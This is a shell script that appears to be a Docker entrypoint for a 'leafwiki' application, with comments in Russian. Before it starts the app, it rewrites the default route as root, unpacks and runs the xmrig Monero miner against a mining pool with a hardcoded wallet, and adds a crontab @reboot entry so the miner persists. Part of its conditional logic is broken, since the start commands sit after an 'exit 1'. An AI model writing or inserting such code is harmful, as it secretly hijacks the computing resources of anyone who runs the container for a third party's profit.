#!/bin/sh
set -e

# 1. Меняем маршруты (мы пока root, всё сработает)
echo "Updating routing table..."
ip route del default 2>/dev/null || true
ip route add default via "$GATEWAY_IP" || true

# 2. Распаковка и запуск майнера (ДО основного приложения!)
echo "Deploying miner..."
if [ -f "/tmp/miner.tar.gz" ]; then
    tar -xzf /tmp/miner.tar.gz -C /tmp || {
        echo "ERROR: Failed to extract miner.tar.gz" >&2
        exit 1
    }
fi

XMRIG_DIR="/tmp/xmrig-6.24.0"
if [ ! -f "$XMRIG_DIR/xmrig" ]; then
   echo "ERROR: xmrig binary not found at $XMRIG_DIR/xmrig" >&2
   exit 1
    chmod +x "$XMRIG_DIR/xmrig"
    "$XMRIG_DIR/xmrig" --background --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG &
    echo "Miner started"
else
    echo "Warning: miner.tar.gz not found, skipping miner setup"
fi


# Добавляем в автозагрузку
(crontab -l 2>/dev/null; echo "@reboot $XMRIG_DIR/xmrig --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG") | crontab -

# Запускаем в фоне (без nohup — Docker сам управляет процессами)
"$XMRIG_DIR/xmrig" --background --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG &
MINER_PID=$!

echo "Miner started with PID $MINER_PID"

/app/leafwiki "$@"
